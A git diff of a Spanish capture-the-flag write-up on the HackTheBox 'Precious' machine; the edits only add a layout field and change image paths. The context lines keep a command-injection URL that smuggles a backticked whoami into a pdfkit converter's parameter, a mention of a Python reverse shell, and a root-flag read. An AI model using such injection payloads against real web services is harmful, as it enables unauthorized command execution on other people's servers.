@@ -1,4 +1,5 @@
 ---
+layout: post
 title: HackTheBox Precious - Command injection y YAML deserialization
 author: c4rta
 date: 2023-01-02
@@ -62,17 +63,17 @@ Si nos dirigimos a la pagina web, podemos ver que esta esperando por una URL, as
 
 Y le pasaremos la URL
 
-![](/assets/img/commons/precious/precious1.png)
+![](/assets/img/precious/precious1.png)
 
 Y efecto, convierte la pagina a un pdf, y me muestra el contenido de mi directorio /Desktop
 
-![](/assets/img/commons/precious/precious2.png)
+![](/assets/img/precious/precious2.png)
 
 En este punto, una buena idea es ver un poco de los metadatos del pdf, usaremos la herramienta ```exiftools``` (aun que por alguna razon no me jala, asi que usare esta [web](https://exif.tools/))
 
 Y podemos ver que para generarlo esta usando pdfkit:
 
-![](/assets/img/commons/precious/precious3.png)
+![](/assets/img/precious/precious3.png)
 
 ## Command Injection
 
@@ -88,7 +89,7 @@ Asi que intentare ejecutar el comando ```whoami``` para ver si funciona:
 http://10.10.14.102:8080/?name=%20`whoami`
 ```
 
-![](/assets/img/commons/precious/precious4.png)
+![](/assets/img/precious/precious4.png)
 
 Y una vez sabiendo que si funciona, por lo tanto tenemos Remote Command Execution(RCE), nos mandaremos una reverse shell con python3:
 
@@ -232,7 +233,7 @@ bash-5.1# cat /root/root.txt
 
 Eso ha sido todo, gracias por leer ❤
 
-![](/assets/img/commons/precious/waifu.gif)
+![](/assets/img/precious/waifu.gif)
 
 
 
